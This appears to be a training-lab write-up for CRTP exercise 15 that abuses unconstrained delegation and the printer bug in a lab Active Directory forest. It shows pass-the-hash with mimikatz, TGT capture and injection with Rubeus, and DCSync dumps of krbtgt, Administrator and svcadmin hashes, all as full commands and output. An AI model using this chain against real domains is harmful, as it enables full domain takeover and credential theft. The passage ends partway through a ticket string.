# CRTP: Hands-On 15

```
  • Find a server in dcorp domain where Unconstrained Delegation is enabled.
  • Compromise the server and escalate to Domain Admin privileges.
  • Escalate to Enterprise Admins privileges by abusing Printer Bug!
```

Index:

  1. [Unconstrained Delegation](#unconstrained-delegation)
  2. [Compromise Server](#compromise-server)
  3. [Escalate Enterprise Admin](#escalate-enterprise-admin)


## Unconstrained Delegation
Find DOmain Objects with Unconstrained delegation :

```
PS C:\Users\student162> Get-DomainComputer -Unconstrained  | select name

name
----
DCORP-DC
DCORP-APPSRV
```

## Compromise Server
Spawn new terminal with appadmmin user that hash local administrative acces to dcorp-appsrv:
```
C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "privilege::debug" "sekurlsa::pth /domain:dollarcorp.moneycorp.local /user:appadmin /ntlm:d549831a955fee51a43c83efb3928fa7 /run:cmd" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /domain:dollarcorp.moneycorp.local /user:appadmin /ntlm:d549831a955fee51a43c83efb3928fa7 /run:cmd
user    : appadmin
domain  : dollarcorp.moneycorp.local
program : cmd
impers. : no
NTLM    : d549831a955fee51a43c83efb3928fa7
  |  PID  6856
  |  TID  5464
  |  LSA Process is now R/W
  |  LUID 0 ; 142151856 (00000000:087910b0)
  \_ msv1_0   - data copy @ 000001D2F02B3870 : OK !
  \_ kerberos - data copy @ 000001D2F0515C08
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001D2EFD914A8 (32) -> null

mimikatz(commandline) # exit
Bye!

```

Validate access to dcorp-appsrv and copy RUbeus.exe binary:

```
PS C:\Windows\system32> Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-appsrv

PS C:\Windows\system32> echo F | xcopy C:\AD\Tools\Rubeus.exe \\dcorp-appsrv\c$\Users\Public /Y
C:\AD\Tools\Rubeus.exe
1 File(s) copied
```
Start monitor mode :

```
C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: TGT Monitoring
[*] Target user     : DCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

Launch pirnter Bug binary with the both Unconstrined delegated machines:
```
C:\Windows\system32>C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.

```

Capture the DCORP-DC$ machine tgt:

```
[*] 5/2/2023 4:29:45 PM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  5/2/2023 6:34:19 AM
  EndTime               :  5/2/2023 4:34:19 PM
  RenewTill             :  5/8/2023 9:01:11 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```
Inject ticket with Rubeus on student user machine:

```
C:\AD\Tools\Rubeus.exe ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

validate ticket:

```
C:\Windows\system32>klist

Current LogonId is 0:0x7bc1b51

Cached Tickets: (1)

#0>     Client: DCORP-DC$ @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 5/2/2023 6:34:19 (local)
        End Time:   5/2/2023 16:34:19 (local)
        Renew Time: 5/8/2023 21:01:11 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

```

Test privileges, and extracts the users krbtgt, Administrator and svcadmin with dcsync attack form domain controller:

```
C:\AD\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd


mimikatz # lsadump::dcsync /user:dcorp\Administrator
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 11/11/2022 7:33:55 AM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: af0686cc0ca8f04df42210c9ac980760

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6a53706d144b585f05e703bf463567bc

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-LOJKLRT8VA4Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 87918d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b
      aes128_hmac       (4096) : 2851a2dcf67dea5217c6fab951633584
      des_cbc_md5       (4096) : ae857fd3ec19b63b
    OldCredentials
      aes256_hmac       (4096) : 2e0a4ff15d58c3bba89f032bd85f342c31bfc656b190e054f50690de029653f4
      aes128_hmac       (4096) : a3b5cb95b4d259fa6e13c9f9067203a9
      des_cbc_md5       (4096) : 08ce97c4c720ce0d
    OlderCredentials
      aes256_hmac       (4096) : dcc9a74b4c1fdaafab4a15e39bb0243d1e32b1d759895b19f5b6ecbe5dc7570f
      aes128_hmac       (4096) : a304a23629c774268a8253ac3bb494b5
      des_cbc_md5       (4096) : 1a7332648c738f8a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-LOJKLRT8VA4Administrator
    Credentials
      des_cbc_md5       : ae857fd3ec19b63b
    OldCredentials
      des_cbc_md5       : 08ce97c4c720ce0d


mimikatz # lsadump::dcsync /user:dcorp\svcadmin
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\svcadmin' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : svc admin

** SAM ACCOUNT **

SAM Username         : svcadmin
User Principal Name  : svcadmin
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 11/14/2022 10:06:37 AM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-1118
Object Relative ID   : 1118

Credentials:
  Hash NTLM: b38ff50264b74508085d82c69794a4d8
    ntlm- 0: b38ff50264b74508085d82c69794a4d8
    lm  - 0: 7eed31e6588f2887266e1c1ae1b9c091

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 016412d07b7b0ebf7800653938513686

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALsvcadmin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
      aes128_hmac       (4096) : 8c0a8695795df6c9a85c4fb588ad6cbd
      des_cbc_md5       (4096) : f81ac208cefbd3f8

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALsvcadmin
    Credentials
      des_cbc_md5       : f81ac208cefbd3f8

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  05b02424fd8e96ca5f37aa30389175c2
    02  7c7a29f7fb11c02a74ecafdfd790b53f
    03  763366c1be2eda3d4c78ef701a0d0d71
    04  05b02424fd8e96ca5f37aa30389175c2
    05  7c7a29f7fb11c02a74ecafdfd790b53f
    06  a64b64f56c2ef411f72746d691d5241a
    07  05b02424fd8e96ca5f37aa30389175c2
    08  ab666ef8a931fef18959254b073b6f8f
    09  ab666ef8a931fef18959254b073b6f8f
    10  3dc387f64435d622a3fbf3087915d733
    11  c8a1d10da47fcc00f33674ba1fbc8144
    12  ab666ef8a931fef18959254b073b6f8f
    13  1e7076378853ef9e9c27f0fcbcf75a76
    14  c8a1d10da47fcc00f33674ba1fbc8144
    15  e38c5c0216054eb6d26688d9af7d448c
    16  e38c5c0216054eb6d26688d9af7d448c
    17  b3703f43cf881499e3feb18bd5696ef7
    18  507286468bd716d0fcf79ae638e468dd
    19  baf901fa6574b03f2114d3475451b722
    20  8eeb96d4cdb22403ee114341482458ed
    21  bdae7b3407921eb38b9ffe5083bc053f
    22  bdae7b3407921eb38b9ffe5083bc053f
    23  eb1a81e6ef387e58f2dccc4e5c9d4f38
    24  bdae7b3407921eb38b9ffe5083bc053f
    25  bdae7b3407921eb38b9ffe5083bc053f
    26  eb1a81e6ef387e58f2dccc4e5c9d4f38
    27  89e41fe538546256ddc4a1902a4f72e4
    28  6746abe26c55920e6ba2b0a9707eba27
    29  6ac1530ccd86dcbbe6e825b45dfa607f



```
## Escalate Enterprise Admin


Using the same technique for escalate privileges to enterprise admin, duw the Domain comntroller of moneycorp.local by default is Unconstrined delegated:

```
C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: TGT Monitoring
[*] Target user     : MCORP-DC$
[*] Monitoring every 5 seconds for new TGTs

```
Print bug:
```
>C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.


```

Captured TGT:

```
[*] 5/2/2023 4:39:28 PM UTC - Found new TGT:

  User                  :  MCORP-DC$@MONEYCORP.LOCAL
  StartTime             :  5/2/2023 6:35:23 AM
  EndTime               :  5/2/2023 4:35:23 PM
  RenewTill             :  5/8/2023 9:02:48 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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
```

Inject extracted ticket:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe ptt /ticket:doIF1jCCBdKgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoREbD01PTkVZQ09SUC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPTU9ORVlDT1JQLkxPQ0FMo4IEgzCCBH+gAwIBEqEDAgECooIEcQSCBG38XmzM5gJAszqSYAA+kYxKrKyV2t5kmB4mBUNxP6bP9+EiKilLCLZmzfeQSENnJ5UtUpCc0Ea/+NsXgp8ZxiSROTgWq1+WKGgc20Ly7eMRBWAGu2YiZTvwaWsDK9qN5lbgKl5ldVDbVtZFZl4C7q/Kz3YdbUn1891LqSuwu6itJ/oxYoEXLiAfE+8eEKE38qbKZ2L2E25p3YmvdfZvvQOGZSJsPhlRtHKk4MRhl6nVDYz5ewVF9Xz8V0VxsFqOo3GHiXvv53dcCEOC6aAn1Ror+Knh7AuLios4C+T/yYuLG75E8lF0pCx77kWGvU3S44AeagB59kO6v54d1RxvYa+pFAqzKfBoLeKK0ATy4nH5904bEB72kF8aYlUxedLc7/iK2toj5L+lKJfy77unIWGVx+J1gD1kPHffHz6kDROzU2qCSY4U//w8rdPYdnjrJe98F2xZMrDnWVnqXpPvaLrmoEhxDtufQyCKVdygdf0DJS1pO3WwIBvBJL9XkzcfpC54xqEkdAwtgUelimWte6Eu0Dkc2navSOg7Osp1HW9udJ8WxLDhG645jeX12cvxa/LlOz5ZvNBeemR9M+V5rZr/P/BJ2C62peWAixa/oU368xGafwaPDBJBEbjhIaqFTOmgrmp6RyiVEpEseM5rxEgHvT7fwRWJ9+hNgcpeDTnMpCKqkj8gEaurgzvi0QMVhZTnqQ0ewfI6T18Uk0W5+yJIbGK9Jw/oyzbkk7hoOYcXjCQ1ZCUeRSEau0sE3ngQ/IDgA0SS4V7qFJXGrRugJIx/pKzKnoGkIYtGhAWkjaaRIEeRgvCDvI31XneHi9kXauwuHqnMSwqO/mgpQGaJ6bcPQlizYZ8UWtv5rMg8u6gENZqrc/+nAv8dHCuDfagMEZSeNq1sTP1UwFmIAVn4wSZreBcVf/J/U7C/ouUDxXKgxgxYRkbdteIAhnPd8aVL+RrF0iTU45cToe8QxTc4ASJqu/ppc5HEGpxz90dV22aKnNmZcogPlCqU7vAbJj43uOs/DHZyXXWaf7qTyLS2peHSLCKro5/8wa2b4YaUVZNQ/RnOoz3ZLH5W21rCNHFYZu47QQb8Hu3QqkVJGRmqQ+r+5cUpyBaJy/cX+dI6R2qsKXnp6vZvYzT7zO3xGhYanAg1KUKYLmPFnXl6qU5qgJItDs8rknbc2b1zW+0V0YpAIiVtVfh1fF1CX5dXhu9mL3Dt5ZpQTDQV5Iwu918/K/oG2JSJRCe+63AklXtMNTk2kdM6i7yO/xrVB5M5nX3mkXjWHx6kN72GtF4o9OhD0fBZOt3oYU6hjgnLUnrYdWOvApcud/iB1QZtG35/